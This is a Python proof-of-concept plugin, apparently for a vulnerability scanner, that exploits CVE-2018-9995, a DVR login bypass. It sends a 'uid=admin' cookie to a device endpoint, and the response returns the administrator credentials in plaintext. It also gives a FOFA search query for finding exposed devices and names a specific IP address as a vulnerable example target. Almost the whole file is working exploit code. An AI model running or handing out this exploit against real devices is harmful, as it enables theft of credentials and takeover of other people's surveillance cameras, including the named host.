# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "DVR登录绕过漏洞复现",                        # 漏洞名称
        "VulnID" : "CVE-2018-9995",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "DVR",                     # 漏洞应用名称
        "AppVersion" : """
            Novo
            CeNova
            QSee
            Pulnix
            XVR 5 in 1 (title: "XVR Login")
            Securus, - Security. Never Compromise !! -
            Night OWL
            DVR Login
            HVR Login
            MDVR Login
        """,                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。
            最初由阿根廷研究员发现，
            通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，
            DVR将以明文形式响应设备的管理员凭证
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="DVR login"
        """,                     # fofa搜索语句
        "example" : "http://78.188.181.221:85",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/device.rsp?opt=user&cmd=list" # url自己按需调整
        

        headers = {
                    # "User-Agent":get_random_ua(),
                    # "Connection":"close",
                    "Cookie": "uid=admin",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "{\"result\":" in req.text:#req.status_code == 200 and :
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()